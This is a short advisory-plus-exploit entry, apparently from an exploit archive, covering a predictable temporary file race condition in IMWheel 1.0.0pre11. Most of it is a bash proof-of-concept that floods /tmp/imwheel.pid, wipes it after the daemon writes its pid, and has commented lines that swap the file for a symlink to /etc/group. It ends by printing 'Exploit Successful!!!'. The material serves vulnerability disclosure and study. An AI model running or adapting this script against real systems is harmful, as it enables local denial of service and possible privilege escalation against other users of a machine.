@@ -1,0 +1,30 @@
+source: http://www.securityfocus.com/bid/11008/info
+
+IMWheel is reported prone to a predictable temporary file creation vulnerability. This issue is a race condition error and may allow a local attacker to carry out denial of service attacks against other users and possibly gain elevated privileges.
+
+This vulnerability was identified in IMWheel 1.0.0pre11, however, other versions may be affected as well. 
+
+#!/bin/bash
+
+# you may have to adjust the number of characters in the print to
+# get the timing correct for the injection. Fewer characters seems
+# to prevent this from working. Optionally, replacing the echo
+# with the symlink creation at the end of this script seems to work
+# fairly regularly.
+CHARCOUNT=4000
+
+echo `perl -e 'print "9" x $CHARCOUNT;'` > /tmp/imwheel.pid
+while [[ $? != 0 ]]; do
+echo `perl -e 'print "9" x $CHARCOUNT;'` > /tmp/imwheel.pid
+done
+
+# Wait for imwheel to write it's pid to the new file
+sleep 1
+# Wipe the contents of the PID file.
+echo > /tmp/imwheel.pid
+
+# Optionally, replace the new file with a link
+# rm /tmp/imwheel.pid
+# ln -s /etc/group /tmp/imwheel.pid
+
+echo "Exploit Successful!!!" 
